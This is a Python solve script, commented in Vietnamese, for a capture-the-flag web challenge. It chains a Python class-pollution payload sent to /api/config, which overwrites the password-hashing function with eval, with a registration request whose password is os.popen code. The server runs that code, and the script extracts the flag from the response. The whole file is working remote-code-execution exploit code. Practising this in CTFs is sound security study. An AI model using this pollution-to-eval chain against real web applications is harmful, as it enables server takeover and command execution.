import requests
import re
import sys
import random
import string
from urllib.parse import urljoin

def generate_random_string(length=10):
    """Tạo một chuỗi ngẫu nhiên."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def exploit(base_url):
    # Sử dụng một session duy nhất cho tất cả request
    s = requests.Session()
    
    # === BƯỚC 1: Chuẩn bị tài khoản để thực hiện Pollution ===
    initial_user = generate_random_string()
    initial_pass = generate_random_string()
    
    print(f"[*] Bước 1: Đăng ký và đăng nhập tài khoản ban đầu: {initial_user}")
    
    # Đăng ký
    s.post(urljoin(base_url, '/register'), data={'username': initial_user, 'password': initial_pass})
    
    # Đăng nhập
    login_res = s.post(urljoin(base_url, '/login'), data={'username': initial_user, 'password': initial_pass})
    
    if "Logged in successfully" not in login_res.text:
        print("[-] Không thể đăng nhập vào tài khoản ban đầu. Thử lại...")
        return
    print("[+] Đã đăng nhập và có session.")

    # === BƯỚC 2: Gửi Payload Prototype Pollution ===
    api_url = urljoin(base_url, '/api/config')
    
    # Payload sẽ ghi đè hàm băm mật khẩu bằng chuỗi "eval"
    payload_pollute = {
        "__class__": {
            "__init__": {
                "__globals__": {
                    "generate_password_hash": "eval" 
                }
            }
        }
    }
    
    print("[*] Bước 2: Gửi payload để ghi đè 'generate_password_hash'...")
    res = s.post(api_url, json=payload_pollute)
    
    # Sửa lỗi kiểm tra: chỉ cần key "success" tồn tại trong JSON là được
    if "success" in res.json():
         print("[+] Ghi đè môi trường thành công!")
    else:
         print("[-] Gửi payload thất bại!")
         print(res.text)
         return

    # === BƯỚC 3: Kích hoạt Gadget và Trích xuất Flag ===
    # Đăng ký một tài khoản mới để kích hoạt gadget generate_password_hash đã bị ghi đè.
    trigger_user = generate_random_string()
    # Mật khẩu chính là mã Python mà 'eval' sẽ thực thi.
    trigger_pass_command = "__import__('os').popen('/app/readflag').read()"
    
    print(f"[*] Bước 3: Đăng ký tài khoản mới '{trigger_user}' để kích hoạt payload.")
    print(f"[*] Mật khẩu thực thi: {trigger_pass_command}")
    
    register_url = urljoin(base_url, '/register')
    
    # Gửi request đăng ký. Request này sẽ không dùng session của attacker.
    # Nó sẽ kích hoạt lỗi server và flag sẽ nằm trong response của lỗi đó.
    try:
        r = requests.post(register_url, data={'username': trigger_user, 'password': trigger_pass_command}, timeout=10)
        
        print("[*] Phân tích response từ server...")
        match = re.search(r'fwectf\{[a-zA-Z0-9_@!?-]+\}', r.text)
        if match:
            print("\n" + "="*50)
            print(f"[+] TÌM THẤY FLAG!")
            print(f"[+] Flag: {match.group(0)}")
            print("="*50)
        else:
            print("\n[-] Không tìm thấy flag trong response.")
            print("[!] Server đã trả về (500 ký tự đầu):")
            print(r.text)

    except requests.exceptions.RequestException as e:
        print(f"[-] Lỗi khi gửi request kích hoạt: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Sử dụng: python solve.py <URL>")
        print("Ví dụ: python solve.py http://challenge.fwectf.com:8006")
        sys.exit(1)
        
    target_url = sys.argv[1].rstrip('/')
    exploit(target_url)